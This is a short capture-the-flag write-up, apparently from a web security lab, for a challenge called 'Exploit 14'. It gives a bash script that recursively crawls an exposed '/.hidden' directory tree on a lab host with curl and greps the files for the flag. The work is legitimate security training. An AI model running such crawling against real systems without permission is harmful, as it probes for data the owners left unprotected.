# Exploit 14 - nested directories

Under `/.hidden` there is a large file tree with txt files in each directory.
It looks like admin wanted to hide something inside.

As the filetree is very large, we need a script to automatically crawl its content
for the flag.

Here's such a script, that recursively crawl the filetree:

```bash
crawl()
{
    curl -s -X GET "$1" \
        | sed -n 's/.*href="\([^"]*\).*/\1/p' \
        | grep -v "^\.\." \
        | while read line; do
            echo -n "." >&2
            if [[ $line == *"/"* ]]; then
                crawl "$1$line"
            else
                # echo "Trying $1$line"
                # xargs should exit with failure if the string is not found
                curl -s -X GET "$1$line"
            fi
          done
}

crawl "http://192.168.56.101/.hidden/" \
    | grep "flag" \
    | head -1 \
    | xargs -I {} echo -e "\n{}"
```
